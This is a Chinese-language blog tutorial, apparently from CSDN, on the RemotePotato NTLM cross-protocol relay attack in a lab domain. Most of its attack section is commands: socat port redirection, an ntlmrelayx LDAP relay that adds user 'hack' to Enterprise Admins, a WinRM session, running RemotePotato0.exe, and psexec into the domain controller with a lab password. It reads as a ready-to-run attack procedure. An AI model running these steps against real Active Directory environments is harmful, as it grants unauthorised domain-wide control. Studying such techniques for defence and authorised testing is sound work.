RemotePotato是Antonio Cocomazzi和Andrea Pierini发现的一种域内攻击技术，它允许攻击者将域[用户权限](https://so.csdn.net/so/search?q=%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90&spm=1001.2101.3001.7020)提升到Enterprise Admin组内，此技术执行跨协议中继以实现NTLM Relay攻击，并将提升的NTLM身份验证流量中继到域控制器以实现权限提升。

利用前提条件：

*   具有域管理员特权的用户已经登录到受害者主机或通过远程桌面登录
*   攻击者已获得对受害者主机的初始访问权限，或者已通过WinRM或SSH访问(拥有本地管理员权限的账号，可以是本地administrator账号或域普通用户) 

*   LDAP和SMB签名未配置

有如下拓扑图，

![](https://img-blog.csdnimg.cn/img_convert/47bc6f18ec90f90d62a13c1585e5f95d.png)

首先，在攻击机上执行如下命令，将本地135端口的流量转发到10.211.55.13的9998端口

```
sudo stty -tostop
sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:10.211.55.13:9998
```


![](https://img-blog.csdnimg.cn/img_convert/2d116ddb4be1b29a0f557e535117cb0c.png)

然后在攻击机上执行如下命令，进行ntlmrelay的监听，将要被提升权限的用户是hack

```
python3 ntlmrelayx.py -t ldap://10.211.55.4 --no-wcf-server --escalate-user hack
```


![](https://img-blog.csdnimg.cn/img_convert/839316bdbec15c3c842e95e4a1927670.png)

然后在攻击机上远程WinRM连接受害者机器。使用域用户hack登录，该用户在10.211.55.13的本地管理员组中。

```
pwsh
Enter-PSSession -ComputerName 10.211.55.13 -Authentication Negotiate -Credential $(get-credential)
```


![](https://img-blog.csdnimg.cn/img_convert/26b861a14c1a153f74383e20e2922618.png)

然后在目标机器上执行RemotePotato0.exe程序

```
.\\RemotePotato0.exe -r 10.211.55.15 -p 9998
```


![](https://img-blog.csdnimg.cn/img_convert/bb462ab19b77945184832fbb1463e7a5.png)

可以看到，我们ntlmrelayx脚本这里已经攻击成功了，hack用户已经成功提权，加进了Enterprise admins管理员组内。

![](https://img-blog.csdnimg.cn/img_convert/a01677b7b2aac5b09bcba5ac29e7b150.png)

![](https://img-blog.csdnimg.cn/img_convert/41bd3891e00d2ede0a8be93c53ce9e0e.png)

没提权权限之前hack用户不能远程连接域控。提升权限后，hack用户可以远程连接域控

```
python3 psexec.py xie/hack:P@ss1234@10.211.55.4
```


![](https://img-blog.csdnimg.cn/img_convert/f9703d557c6d29ed2ce9e88bca1677fb.png)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[Remote Potato – From Domain User to Enterprise Admin – Penetration Testing Lab](https://pentestlab.blog/2021/05/04/remote-potato-from-domain-user-to-enterprise-admin/ "Remote Potato – From Domain User to Enterprise Admin – Penetration Testing Lab")